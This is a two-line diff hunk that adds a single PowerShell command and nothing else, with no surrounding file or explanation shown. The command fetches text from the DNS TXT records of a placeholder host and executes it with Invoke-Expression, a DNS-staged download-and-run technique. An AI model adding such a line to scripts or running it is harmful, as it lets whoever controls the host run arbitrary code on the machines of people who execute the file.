@@ -1,0 +1,2 @@
+iex ((Resolve-DnsName -Name stage.example.invalid -Type TXT).Strings -join '')
+
